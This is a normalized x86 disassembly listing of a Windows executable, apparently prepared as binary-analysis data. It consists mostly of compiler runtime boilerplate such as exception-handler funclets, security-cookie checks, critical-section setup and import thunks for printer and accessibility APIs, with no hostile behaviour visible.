sub_41a87d
retn
sub_41aaff
push sub_41aabd
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
sub_41b1b4
xor eax eax
inc eax
retn
sub_41b3a9
push 0x4
call sub_418f7d
pop ecx
retn
sub_41b3e9
mov [ ecx ] r--data
jmp sub_41504f
sub_41b545
push [ ebp - 0x14 ]
call sub_41b47a
pop ecx
retn
sub_41b589
call sub_41a075
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_41a075
add eax 0x90
dec [ eax ]
sub_41b62c
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_41b635
mov esp [ ebp - 0x18 ]
call sub_41c084
sub_41b6e2
push 0x4
mov eax sub_425f67
call sub_415bf3
call sub_41a075
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_41c0bd
call sub_41c0d0
sub_41b7bb
mov eax [ ebp - 0x14 ]
call sub_41b5a4
retn
sub_41ba32
xor eax eax
inc eax
retn
sub_41ba36
mov esp [ ebp - 0x18 ]
call sub_41c084
sub_41bacb
xor eax eax
inc eax
retn
sub_41bacf
mov esp [ ebp - 0x18 ]
call sub_41c084
sub_41bf81
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_414ff2
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_41c084
push 0x8
push r--data
call sub_415ff4
call sub_41a075
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_41c16c
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_41c0a4
xor eax eax
inc eax
retn
sub_41c0bd
call sub_41a075
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_41c084
call eax
sub_41c0f4
xor eax eax
inc eax
retn
sub_41c108
push sub_41c084
call sub_419d71
pop ecx
mov [ rw-data ] eax
retn
sub_41c2a4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_41c472
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_41c39c
add esp 0xc
pop ebp
retn 0x4
sub_41c4a5
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_420619
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_41c4d8
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_41c39c
add esp 0xc
pop ebp
retn 0x8
sub_41e0a8
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41e066
add esp 0x10
pop ebp
retn
sub_41e0e1
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_41df55
pop ecx
pop ecx
pop ebp
retn
sub_41e0f4
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_41dfc8
pop ecx
pop ecx
pop ebp
retn
sub_41eae3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_41eb38
push [ rw-data ]
call sub_419dec
pop ecx
retn
sub_41ecb9
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_418f7d
pop ecx
sub_41ecf5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_41ed04
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_41ed34
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
xor ecx ecx
cmp eax 0xc0000017
sete cl
mov eax ecx
retn
sub_41ed4b
mov esp [ ebp - 0x18 ]
cmp [ ebp - 0x20 ] 0xc0000017
jne r-xdata
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_416039
retn
push 0x8
call [ SetLastError@IAT ]
sub_41ee32
xor eax eax
retn
sub_41f535
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
fld [ ebp + 0x8 ]
frndint
fstp [ ebp - 0x8 ]
fld [ ebp - 0x8 ]
leave
retn
sub_41f68e
mov edi edi
push ebp
mov ebp esp
push ecx
fwait
fnstsw [ ebp - 0x4 ]
movsx eax [ ebp - 0x4 ]
leave
retn
sub_41f69e
mov edi edi
push ebp
mov ebp esp
push ecx
fnstsw [ ebp - 0x4 ]
fnclex
movsx eax [ ebp - 0x4 ]
leave
retn
sub_41f75d
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_41fd98
push 0xc
call sub_418f7d
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_420065
push 0xd
call sub_418f7d
pop ecx
retn
sub_420430
push 0xd
call sub_418f7d
pop ecx
retn
sub_420469
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_4202cf
pop ecx
mov [ rw-data ] 0x1
sub_4204da
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_420487
add esp 0x10
pop ebp
retn
sub_4204f2
mov edi edi
push ebp
mov ebp esp
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
xor eax eax
sub_4205ed
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_420524
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_420638
call eax
retn
sub_42086e
push [ ebp + 0x8 ]
call sub_422999
pop ecx
retn
sub_42107d
push [ ebp + 0x8 ]
call sub_422999
pop ecx
retn
sub_4211eb
call sub_422cae
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_415093
pop ecx
retn
call sub_422a85
sub_4214a2
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_4215cf
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4214b8
add esp 0x10
pop ebp
retn
sub_421621
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_4215e9
pop ecx
pop ecx
pop ebp
retn
sub_421c0f
push 0x2
call sub_418293
pop ecx
retn
sub_421df0
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_421c84
add esp 0x14
pop ebp
retn
sub_421e0d
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_42305a
add esp 0xc
pop ebp
retn
sub_4227d0
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_4185c0
sub_4227e6
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_4185c0
sub_422990
push 0xa
call sub_418f7d
pop ecx
retn
sub_422b1b
push 0x1
call sub_418f7d
pop ecx
retn
sub_422c76
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_4212ba
pop ecx
pop ecx
retn
sub_422ca5
push 0x1
call sub_418f7d
pop ecx
retn
sub_422cae
push 0x1
call sub_422bd4
pop ecx
retn
sub_425165
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileA@IAT ]
mov [ rw-data ] eax
retn
sub_42529c
push esi
call sub_42127e
pop ecx
retn
sub_42537b
push [ ebp + 0x8 ]
call sub_422999
pop ecx
retn
sub_425720
push [ ebp + 0x8 ]
call sub_422999
pop ecx
retn
sub_425760
lea eax [ edx - 0x1 ]
pop ebx
retn
sub_42584d
mov edi edi
push esi
push 0x18
mov esi ecx
push 0x0
push esi
call sub_415f60
add esp 0xc
mov eax esi
pop esi
retn
sub_425863
push 0xc
push r--data
call sub_415ff4
and [ ebp - 0x4 ] 0x0
push ecx
call [ InitializeCriticalSection@IAT ]
and [ ebp - 0x1c ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_416039
retn
sub_425880
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
xor ecx ecx
cmp eax 0xc0000017
sete cl
mov eax ecx
retn
sub_4258ae
mov edi edi
push esi
mov esi ecx
lea ecx [ esi + 0x14 ]
call sub_42584d
xor eax eax
mov [ esi + 0x2c ] eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
mov eax esi
pop esi
retn
sub_4258ca
mov edi edi
push esi
mov esi ecx
lea eax [ esi + 0x14 ]
push eax
call [ DeleteCriticalSection@IAT ]
lea ecx [ esi + 0x2c ]
pop esi
jmp sub_42582e
sub_425922
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_401d60
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_42593f
mov [ ecx ] r--data
jmp sub_401dd0
sub_4259e1
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_401e90
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
CreateStdAccessibleObject
jmp [ CreateStdAccessibleObject@IAT ]
LresultFromObject
jmp [ LresultFromObject@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
ClosePrinter
jmp [ ClosePrinter@IAT ]
DocumentPropertiesW
jmp [ DocumentPropertiesW@IAT ]
OpenPrinterW
jmp [ OpenPrinterW@IAT ]
sub_425a30
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425a4b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425a66
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425a81
push rw-data
push [ ebp - 0x10 ]
call sub_401d30
pop ecx
pop ecx
retn
sub_425a91
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425aac
mov ecx [ ebp - 0x10 ]
add ecx 0x34
jmp sub_40b48b
sub_425ab7
mov ecx [ ebp - 0x10 ]
add ecx 0x74
jmp j_sub_40ae32
sub_425ac2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425add
mov ecx [ ebp - 0x10 ]
jmp sub_40b48b
sub_425ae5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425b00
lea ecx [ ebp - 0x10 ]
jmp sub_40b48b
sub_425b08
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425b23
mov ecx [ ebp - 0x14 ]
add ecx 0x34
jmp sub_40b48b
sub_425b2e
mov ecx [ ebp - 0x14 ]
add ecx 0x74
jmp j_sub_40ae32
sub_425b39
push [ ebp + 0x8 ]
call sub_40a919
retn
sub_425b42
push [ ebp + 0x8 ]
call sub_40a919
retn
sub_425b4b
push [ ebp + 0x8 ]
call sub_40a919
retn
sub_425b54
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425b6f
push [ ebp - 0x10 ]
call sub_40a919
retn
sub_425b78
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425b93
lea ecx [ ebp - 0x418 ]
jmp sub_40b48b
sub_425b9e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x420 ]
xor ecx eax
call sub_414a33
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425bc6
lea ecx [ ebp - 0x14 ]
jmp sub_40b48b
sub_425bce
lea ecx [ ebp + 0x10 ]
jmp sub_40b48b
sub_425bd6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425bf1
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_40b48b
sub_425bfc
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425c17
push [ ebp - 0x14 ]
call sub_40a8ea
retn
sub_425c20
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425c3b
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp j_sub_413201
sub_425c46
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp sub_40c53b
sub_425c51
mov ecx [ ebp - 0x10 ]
add ecx 0x38
jmp sub_40c53b
sub_425c5c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425c77
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425c92
lea ecx [ ebp - 0x14 ]
jmp sub_40c8e7
sub_425c9a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425cb5
push [ ebp - 0x10 ]
call sub_40a8ea
retn
sub_425cbe
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425cd9
push [ ebp + 0x8 ]
push [ ebp - 0x10 ]
call sub_40e7fb
retn
sub_425ce5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425d00
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425d1b
mov ecx [ ebp - 0x10 ]
jmp sub_40d719
sub_425d23
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425d3e
lea ecx [ ebp - 0x60 ]
jmp sub_410807
sub_425d46
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425d61
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425d7c
lea ecx [ ebp - 0x224 ]
jmp sub_40c8e7
sub_425d87
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x258 ]
xor ecx eax
call sub_414a33
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425daf
lea ecx [ ebp - 0x14 ]
jmp j_sub_40ef00
sub_425db7
lea ecx [ ebp - 0x28 ]
jmp sub_413a38
sub_425dbf
lea ecx [ ebp - 0x7c ]
jmp sub_410807
sub_425dc7
lea ecx [ ebp - 0x28 ]
jmp sub_413a38
sub_425dcf
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x80 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425dea
push [ ebp - 0x1c ]
call sub_40a5fb
pop ecx
retn
sub_425df4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425e0f
lea ecx [ ebp - 0x418 ]
jmp sub_40b48b
sub_425e1a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x420 ]
xor ecx eax
call sub_414a33
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425e42
lea ecx [ ebp + 0xb ]
jmp sub_4124cb
sub_425e4a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425e65
lea ecx [ ebp + 0xc ]
jmp sub_40fbae
sub_425e6d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425e88
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425ea3
lea ecx [ ebp - 0x418 ]
jmp sub_40b48b
sub_425eae
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x420 ]
xor ecx eax
call sub_414a33
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425ed6
push [ ebp + 0x8 ]
call sub_40a5fb
pop ecx
retn
sub_425ee0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425efb
push [ ebp - 0x20 ]
call sub_40a8ea
retn
sub_425f04
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425f1f
push [ ebp - 0x18 ]
call sub_40a8ea
retn
sub_425f28
push [ ebp - 0x18 ]
call sub_40a8ea
retn
sub_425f31
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425f4c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425f67
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425f82
lea ecx [ ebp - 0x28 ]
jmp sub_4030e0
sub_425f8a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425fb0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_425fd0
mov eax [ ebp + 0x4 ]
jmp sub_403320
sub_425fd8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x4 ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_426000
mov ecx [ ebp - 0x10 ]
jmp sub_41504f
sub_426008
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_426030
mov ecx [ ebp - 0x10 ]
jmp sub_41504f
sub_426038
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8 ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_426060
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_426080
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_414a33
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_4260b0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_4260d0
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
call sub_401d30
add esp 0x8
retn
sub_4260e1
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8 ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_426100
lea ecx [ ebp - 0x50 ]
jmp sub_4030e0
sub_426108
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x44 ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_426130
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_426150
lea esi [ ebp - 0x898 ]
jmp sub_403110
sub_42615b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8a8 ]
mov ecx [ edx - 0x8ac ]
xor ecx eax
call sub_414a33
add eax 0x10
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_426190
mov ecx [ ebp - 0x10 ]
jmp sub_404440
sub_426198
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8 ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_4261c0
mov ecx [ ebp + 0x4 ]
jmp sub_404440
sub_4261c8
mov eax [ ebp + 0x4 ]
add eax 0x10
push eax
call sub_4031b0
retn
sub_4261d5
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x4 ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_4261f0
mov ecx [ ebp - 0x268 ]
jmp sub_404440
sub_4261fb
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x288 ]
mov ecx [ edx - 0x28c ]
xor ecx eax
call sub_414a33
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_426230
lea ecx [ ebp - 0x9f38 ]
jmp sub_4013b0
sub_42623b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x9f44 ]
mov ecx [ edx - 0x9f48 ]
xor ecx eax
call sub_414a33
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_426270
lea ecx [ ebp - 0x78 ]
jmp sub_4013b0
sub_426278
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xa4 ]
mov ecx [ edx - 0xa8 ]
xor ecx eax
call sub_414a33
add eax 0x8
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_4262b0
lea ecx [ ebp - 0x2b8 ]
jmp sub_4013b0
sub_4262bb
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2b4 ]
mov ecx [ edx - 0x2b8 ]
xor ecx eax
call sub_414a33
add eax 0x8
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_4262f0
lea esi [ ebp - 0x28 ]
jmp sub_403110
sub_4262f8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x30 ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_414a33
mov eax r--data
jmp sub_415867
sub_426313
push sub_4265d8
call sub_415f3a
pop ecx
retn
sub_42631f
push sub_4265e3
call sub_415f3a
pop ecx
retn
sub_42632b
push sub_4265ee
call sub_415f3a
pop ecx
retn
sub_426337
push sub_4265f9
call sub_415f3a
pop ecx
retn
sub_426343
push sub_426603
call sub_415f3a
pop ecx
retn
sub_42634f
mov ecx rw-data
jmp sub_40c6a0
sub_426359
mov ecx rw-data
call sub_40ca85
push sub_42660d
call sub_415f3a
pop ecx
retn
sub_42636f
push sub_426617
call sub_415f3a
pop ecx
retn
sub_42637b
push r--data
call [ RegisterWindowMessageW@IAT ]
mov [ rw-data ] eax
retn
sub_426538
push rw-data
call sub_40a6aa
retn
sub_426543
push 0x0
mov ecx rw-data
call sub_40a882
and [ rw-data ] 0x0
and [ rw-data ] 0x0
push sub_426649
mov [ rw-data ] r--data
mov [ rw-data ] 0xf022
call sub_415f3a
pop ecx
retn
sub_42657d
push 0x0
mov ecx rw-data
call sub_40a882
and [ rw-data ] 0x0
and [ rw-data ] 0x0
push sub_426654
mov [ rw-data ] r--data
mov [ rw-data ] 0xf024
call sub_415f3a
pop ecx
retn
sub_4265b7
push rw-data
call sub_40a6aa
retn
sub_4265c2
mov ecx rw-data
call sub_4258e2
push sub_42665f
call sub_415f3a
pop ecx
retn
sub_4265d8
mov [ rw-data ] r--data
retn
sub_4265e3
mov [ rw-data ] r--data
retn
sub_4265ee
mov [ rw-data ] r--data
retn
sub_4265f9
mov ecx rw-data
jmp sub_40ae32
sub_426603
mov ecx rw-data
jmp sub_40a9d1
sub_42660d
mov ecx rw-data
jmp sub_40cb35
sub_426617
mov ecx rw-data
jmp sub_40a9d1
sub_426621
mov ecx rw-data
jmp sub_410807
sub_42662b
mov ecx rw-data
jmp sub_410807
sub_426635
mov ecx rw-data
jmp sub_410807
sub_42663f
mov ecx rw-data
jmp sub_410807
sub_426649
mov [ rw-data ] r--data
retn
sub_426654
mov [ rw-data ] r--data
retn
sub_42665f
mov ecx rw-data
jmp sub_4258ca
